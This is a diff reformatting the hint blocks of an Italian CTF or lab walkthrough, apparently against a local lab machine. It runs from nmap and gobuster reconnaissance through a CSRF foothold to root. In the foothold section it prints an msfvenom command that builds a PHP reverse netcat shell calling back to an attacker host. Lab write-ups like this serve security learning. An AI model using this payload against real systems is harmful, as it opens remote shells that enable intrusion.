@@ -5,8 +5,8 @@
 ```
 # Nmap 7.991 scan initiated Mon Oct 19 20:51:44 2026 as: /usr/lib/nmap/nmap -sCV -p22,80 -oN target 172.X.X.X
 <details open>
-<summary> ::mark  
-			✴️ HINT  Guarde risultati nmap
+<summary> ✴️ HINT  Guarde risultati nmap
+	<p dir="auto">
 			Nmap scan report for 172.18.0.3
 			Host is up (0.000031s latency)
 			PORT   STATE SERVICE VERSION
@@ -18,6 +18,7 @@
 			Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 			Service detection performed. Please report any incorrect results at https://nmap.org/submit/
 			# Nmap done at Mon Oct 19 20:51:51 2026 -- 1 IP address (1 host up) scanned in 7.20 seconds
+	</p>
 </summary>
 </details>
 
@@ -27,9 +28,8 @@
 	gobuster dir -u http://172.X.X.X/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,html,js,txt -o webscan
 ```
 <details open>
-	<summary> ::mark  
-		💯  HINT Guarda result gobuster
-	===============================================================
+	<summary>💯  HINT Guarda result gobuster
+	<p dir="auto">===============================================================
 	Gobuster v3.8.2
 	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)	
 	===============================================================
@@ -56,7 +56,7 @@
 	Progress: 1102790 / 1102790 (100.00%)
 	===============================================================
 	Finished
-	===============================================================
+	===============================================================</p>
 </summary>
 </details>
 
@@ -68,9 +68,8 @@
         --exclude-length 319 -t 100 -x php,html,js,txt,json
 ```
 <details open>
-	<summary>  ::mark 
-		✴️ HINT guarda risultato gobuster su altro endpoint.
-	===============================================================
+	<summary>✴️ HINT guarda risultato gobuster su altro endpoint.
+	<p dir="auto">===============================================================
 	Gobuster v3.8.2
 	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 	===============================================================
@@ -113,16 +112,15 @@
 	Progress: 27678 / 27678 (100.00%)
 	===============================================================
 	Finished
-	===============================================================
+	===============================================================</p>
 </summary>
 </details>
 
 # foothold (Intrusione).
 >** Dopo vari test e tentativi ripetuti notiamo che l'app e vulnerabile a CSRF, bene creamo un exploit su misura..
 <details open>
-	<summary> ::mark 
-		✴️ HINT guarda rilultati foothold.
-	```bash
+	<summary> ✴️ HINT guarda rilultati foothold.
+	<p dir="auto">```bash
 	<!DOCTYPE html>
 	<html lang="it">
 	<head>
@@ -155,17 +153,16 @@
 		msfvenom -p php/unix/cmd/reverse_netcat LHOST=172.X.X,X LPORT=4444 -f raw > shell.php
 		chmod +x shell.php
 	```
-	>** Siamo dentro come utente www-data,
+	>** Siamo dentro come utente www-data.</p>
 </summary>
 </details>
 
 # Privilege Escalation
 * dopo una lunga ricerca ed enumerazione di systema troviamo le credenziali per elevare i nostri privilegi.
 <details open>
-	<summary>  ::mark 
-		✴️ HINT Guarda risultato privilege escalation
-		```bash
+	<summary> ✴️ HINT Guarda risultato privilege escalation
+		<p dir="auto">```bash
 		su root
-		```
+		```</p>
 	</summary>
 </details>
